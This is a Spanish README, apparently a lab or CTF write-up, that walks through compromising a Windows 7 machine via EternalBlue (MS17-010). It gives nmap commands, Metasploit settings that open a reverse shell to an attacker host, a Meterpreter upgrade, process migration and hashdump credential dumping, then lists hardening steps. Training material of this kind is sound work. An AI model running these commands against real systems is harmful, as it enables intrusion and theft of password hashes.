# **Explotación de Máquina Blue (EternalBlue - MS17-010)**

![Pentest Badge](https://img.shields.io/badge/Level-Easy-green) ![Vulnerability Badge](https://img.shields.io/badge/Vuln-Critical-red)

## **Descripción**
Este repositorio documenta la explotación de una máquina Windows vulnerable al famoso exploit EternalBlue (MS17-010), incluyendo:
1. Detección de la vulnerabilidad SMB
2. Explotación con Metasploit
3. Escalada a Meterpreter
4. Post-explotación y captura de flags

**Tiempo estimado**: 15-25 minutos  
**Dificultad**: Fácil  
**Sistema operativo**: Windows (vulnerable a MS17-010)

## **Índice**
1. [Reconocimiento](#reconocimiento)
2. [Explotación](#explotación)
3. [Post-Explotación](#post-explotación)
4. [Conclusión](#conclusión)

## **Reconocimiento**

### 1. Escaneo Inicial
```bash
nmap -sV -p- 10.0.2.15 -oN initial_scan
```
**Hallazgos clave**:
- 445/tcp : SMB (Windows 7 Professional 7601 Service Pack 1)

### 2. Verificación de Vulnerabilidad
```bash
nmap --script vuln -p 445 10.0.2.15
```
**Confirmación**:
```
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
```

## **Explotación**

### 3. Configuración de Metasploit
```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.0.2.15
set LHOST 10.0.2.4
exploit
```

### 4. Mejora a Meterpreter
En la sesión básica:
```bash
background
use post/multi/manage/shell_to_meterpreter
set SESSION 1
run
sessions -i 2
```

## **Post-Explotación**

### 5. Escalada de Privilegios
```meterpreter
getuid
ps
migrate <PID_de_services.exe>
```

### 6. Captura de Credenciales
```meterpreter
hashdump
```

### 7. Búsqueda de Flags
```meterpreter
search -f *flag*.txt
cat "C:\\Users\\Administrator\\Desktop\\flag.txt"
```

## **Conclusión**

### Vulnerabilidades Críticas
1. Servicio SMB sin parches (MS17-010)
2. Configuración insegura de red

### Hardening Recomendado
- Aplicar actualización KB4012212 de Microsoft
- Deshabilitar SMBv1
- Implementar segmentación de red


**¿Te resultó útil?** ¡Dale una ⭐ al repositorio!

> ⚠️ **Aviso Legal**: Solo para uso en entornos autorizados.

---

**Herramientas utilizadas**:
- Nmap
- Metasploit Framework
- John the Ripper (opcional)

**Referencias**:
- [Microsoft Security Bulletin MS17-010](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010)
- [Mitre ATT&CK T1210](https://attack.mitre.org/techniques/T1210/)
